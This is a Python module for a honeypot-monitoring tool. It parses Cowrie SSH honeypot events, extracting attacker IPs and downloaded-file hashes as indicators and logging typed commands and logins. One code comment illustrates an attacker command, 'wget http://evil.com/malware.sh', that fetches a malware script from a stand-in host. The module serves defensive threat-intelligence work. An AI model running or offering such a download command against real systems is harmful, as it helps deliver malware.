import logging
import hashlib
import uuid
from typing import Optional
from .schemas import CowrieEvent, ParsedHoneypotEvent

logger = logging.getLogger(__name__)

class CowrieParser:
    """Parses Cowrie JSON events and generates actionable intelligence."""
    
    def parse_event(self, event: CowrieEvent) -> ParsedHoneypotEvent:
        created_sample_hash = None
        created_ioc_value = None

        # Auto-extract attacker IP as IOC
        if event.src_ip:
            created_ioc_value = event.src_ip

        # Parse specific event types
        if event.eventid == "cowrie.session.file_download":
            # Attacker downloaded a file (e.g. wget http://evil.com/malware.sh)
            # Cowrie provides the shasum of the downloaded file
            if event.shasum:
                created_sample_hash = event.shasum
                logger.info(f"Honeypot file download detected. Auto-extracting sample hash: {created_sample_hash}")
        
        elif event.eventid == "cowrie.command.input":
            # Attacker typed a command
            logger.info(f"Honeypot command input from {event.src_ip}: {event.input}")

        elif event.eventid == "cowrie.login.success":
            logger.info(f"Honeypot successful login by {event.username} from {event.src_ip}")

        return ParsedHoneypotEvent(
            attacker_ip=event.src_ip,
            event_type=event.eventid,
            raw_event=event.model_dump(),
            created_sample_hash=created_sample_hash,
            created_ioc_value=created_ioc_value
        )
